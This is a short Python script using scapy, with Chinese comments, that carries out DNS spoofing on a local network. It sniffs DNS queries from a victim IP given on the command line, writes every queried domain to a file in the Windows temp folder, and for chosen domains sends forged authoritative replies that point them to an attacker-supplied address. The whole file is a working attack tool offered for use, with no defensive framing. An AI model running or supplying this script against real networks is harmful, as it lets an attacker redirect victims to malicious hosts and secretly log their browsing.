from scapy.all import *
import sys
from scapy.layers.dns import DNS, DNSRR
from scapy.layers.inet import UDP, IP


# 计算flag
def get_flag(user_dns):
    for dns_info in dns_info_list:
        if dns_info in user_dns:
            return 1
    return 0


def DNS_Spoof(pkt):
    try:
        # 把访问域名记录到文件
        # print(pkt[DNS].qd.qname.decode('utf-8')) www.baidu.com
        user_dns = pkt[DNS].qd.qname.decode('utf-8')
        with open("C:/Windows/Temp/HPP9.txt", 'a+', encoding='utf-8') as f:
            f.writelines(user_dns + "\n")

        if DNS in pkt and get_flag(user_dns):
            old_ip = pkt[IP]
            old_udp = pkt[UDP]
            old_dns = pkt[DNS]

            ip = IP(dst=target_info,
                    src=old_ip.dst)  # print(old_ip.dst) 网关
            udp = UDP(dport=old_udp.sport, sport=53)

            Anssec = DNSRR(rrname=old_dns.qd.qname.decode('utf-8'), type='A', rdata='yourip', rclass='IN',
                           ttl=60)

            dns = DNS(id=old_dns.id, ra=1, aa=1, qr=1, qdcount=1, qd=old_dns.qd, ancount=1, an=Anssec)
            # QR 1表示响应，为0表示请求
            # AA 权威应答，在响应包中设置，表示响应是由权威域名服务器发出的
            # RA 可用递归，在响应包中设置，说明支持递归查询
            spoofpkt = ip / udp / dns
            send(spoofpkt, verbose=0)
    except Exception as e:
        print(e)


def DNS_S(ifaces):
    pkt = sniff(iface=ifaces, filter='udp dst port 53', prn=DNS_Spoof)


if __name__ == '__main__':
    network_info = str(sys.argv[1])  # 本机网卡名称
    target_info = str(sys.argv[2])  # 受害者ip
    dns_info_list = sys.argv[3].split(",")  # 需要劫持的域名
    DNS_S(network_info)